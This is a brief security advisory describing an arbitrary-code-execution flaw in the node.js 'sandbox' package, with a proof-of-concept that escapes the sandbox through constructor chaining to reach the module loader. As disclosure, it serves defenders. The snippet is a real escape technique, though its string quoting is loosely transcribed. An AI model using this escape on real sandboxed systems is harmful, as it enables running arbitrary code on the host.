# Overview
`sandbox` is a nifty javascript sandbox for node.js.

This package arise vulnerable to Arbitrary Code Execution, it is possible to escape the sandbox by using a combination of functions and constructors, allowing an attacker to potentially access a process with root permissions and load modules of their choice in order to execute code.

# Proof of Concept
```
new Function("
  return (
    this.constructor.constructor('
      return (this.process.mainModule.constructor._load
     )'
    )())"
  )()
("util").inspect("hi")
```